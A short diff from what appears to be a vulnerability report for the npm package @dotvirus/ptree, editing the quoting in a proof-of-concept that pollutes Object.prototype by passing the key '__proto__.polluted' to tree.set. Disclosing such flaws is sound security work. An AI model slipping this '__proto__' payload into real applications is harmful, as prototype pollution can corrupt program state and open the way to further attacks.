@@ -11,7 +11,7 @@ const ptree = require('@dotvirus/ptree').default
 
 console.log('Before: ' + {}.polluted)
 const tree = new ptree({})
-tree.set("__proto__.polluted", true)
+tree.set('__proto__.polluted', true)
 console.log('After: ' + {}.polluted)
 ```
 2. Execute the following commands in the terminal:
